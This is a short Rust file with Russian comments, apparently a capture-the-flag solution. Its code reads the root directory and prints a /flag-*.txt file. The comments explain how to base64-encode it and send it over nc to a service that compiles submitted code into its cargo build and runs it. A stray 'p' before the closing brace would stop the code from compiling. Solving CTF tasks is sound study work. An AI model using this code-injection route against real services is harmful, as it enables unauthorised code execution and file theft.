//  kek.rs
use std as s;

fn main() {
    for entry in s::fs::read_dir("/").unwrap() {
        let entry = entry.unwrap();
        let path = entry.path();
        let path_str = path.to_string_lossy();
        if path_str.contains("/flag-") && path_str.ends_with(".txt") {
            println!("{}", s::fs::read_to_string(&path).unwrap());
            return;
        }
    }
    p
}

// взять base64 -w0 kek.rs 
// отправить base64 строку сразу после nc или в локальном запуске как параметр main.py

// как работает:
// 1) bash скрипт запускается первым, он запишет значение FLAG в файл с именем  /flag-<случайный hex>.txt
// 2) bash скрипт удалит переменную окружения, но файл останется 
// 3) bash скрипт запустит socat на TCP 2112 и для каждого входного соеденения запускает SYSTEM:/app/main.py форком
// 4) main.py читает одну Base64-строку из stdin, декодирует её и записывает файл kek.rs. Затем main.py вызывает cargo run
// 5) cargo run компилирует проект и затем запускает получившийся бинарник. В процессе компиляции main.rs через include_validated!("kek.rs") включает содержимое kek.rs в сборку — поэтому код, который мы добавили, становится частью исполняемого файла и выполняется при запуске.
// 6) Ну и собственно наш код когда будет выполнятmся,начнет перелистывать файлы и папки в ./, искать файл "/flag-****.txt" и как найдет прочтет его содержимое на stdout, потом stdout заберет main.py и отдаст нам.